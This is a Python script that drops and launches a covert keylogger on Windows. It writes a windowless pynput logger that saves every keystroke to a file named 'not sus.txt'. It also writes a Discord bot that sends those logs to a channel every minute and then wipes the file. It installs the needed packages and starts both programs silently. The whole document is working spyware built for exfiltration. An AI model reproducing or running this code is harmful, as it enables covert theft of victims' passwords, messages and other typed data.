import os
file = open("logger.pyw", "w")

file.write("""
from pynput.keyboard import Key, Listener
import logging

logging.basicConfig(filename=("not sus.txt"), level=logging.DEBUG, format="%(message)s")
 
def on_press(key):
    logging.info(str(key))
 
with Listener(on_press=on_press) as listener :
    listener.join()
""")
file.close()

file = open("sender.pyw", "w")

file.write(r"""
import discord
import asyncio
import time
import os

# bot token, get this from discord dev portal
TOKEN = 'UYTfguytffI6875rb^ivb7BKKUIyYGNo*T&bn8TnO087TnO6TRNo9n6r96n7rn'
client = discord.Client()

@client.event  # event decorator/wrapper 
async def on_ready():  # method expected by client. This runs once when connected  

    print(f'We have logged in as {client.user}')  # notification of login.
    await client.change_presence(activity=discord.Game(name="Logging"))
    client.loop.create_task(my_task())

async def my_task():
    while True:
        channel = client.get_channel(id=1234567890) # channel ID goes here
        logs = ""
        logslist = []
        with open("not sus.txt", mode="r",encoding="utf-8")as my_file:
            my_fileS = my_file.read().splitlines()
            for x in range(len(my_fileS)):
                print(my_fileS[x])
                if my_fileS[x] == "Key.space":
                    logslist.append(' ')
                elif my_fileS[x] == "Key.enter":
                    logslist.append('\n')
                else:
                    logslist.append(my_fileS[x])
            logs = ''.join(logslist).replace('\'','')
            print(logs)
            if logs == "":
                logs = "NULL"
            else:
                with open("not sus.txt", mode="w",encoding="utf-8")as my_file:
                    my_file.write("")
                await channel.send(logs)
        await asyncio.sleep(60) # task runs every n seconds

client.run(TOKEN)
""")


file.close()

package = "pynput"
os.system(f'cmd /c "pip install {package}"')
package = "discord"
os.system(f'cmd /c "pip install {package}"')
package = "asyncio"
os.system(f'cmd /c "pip install {package}"')
package = "logging"
os.system(f'cmd /c "pip install {package}"')

current_dir = os.getcwd()
file_path = current_dir + "\\logger.pyw"

os.system(f'cmd /c "start {file_path}')
file_path = current_dir + "\\sender.pyw"
os.system(f'cmd /c "start {file_path}')



